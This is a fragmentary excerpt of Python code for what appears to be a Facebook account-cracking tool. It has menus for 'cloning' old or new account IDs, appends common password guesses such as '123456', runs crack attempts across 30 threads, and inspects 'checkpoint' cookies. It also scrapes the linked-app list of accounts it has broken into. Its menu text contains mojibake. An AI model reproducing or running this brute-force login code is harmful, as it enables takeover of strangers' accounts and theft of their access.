...
def setting():
	...
	print('') 
	cetak(nel('[bold green]Ã¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£1. CLONE JUST OLD IDZ \nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£2. CLONE JUST NEW IDZ(RECOMEND)\nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold green]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
...
#   elif _jembot_ in ['y','Y']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]Ã¢â‚¬Â¢[green]] ADD PASWORD MXM 6 WORDS\n[[purple]Ã¢â‚¬Â¢[green]] EXIMPLE :[green] 556677,786786,123456[purple] '))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[purple]=>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[green] '))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold green][Ã¢â‚¬Â¢] LIST EXPIRED APPLICATIONS :[/bold green]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold green][{hit}] {muncul[0]} {muncul[1]}[/bold green]\n")
					print('\n')
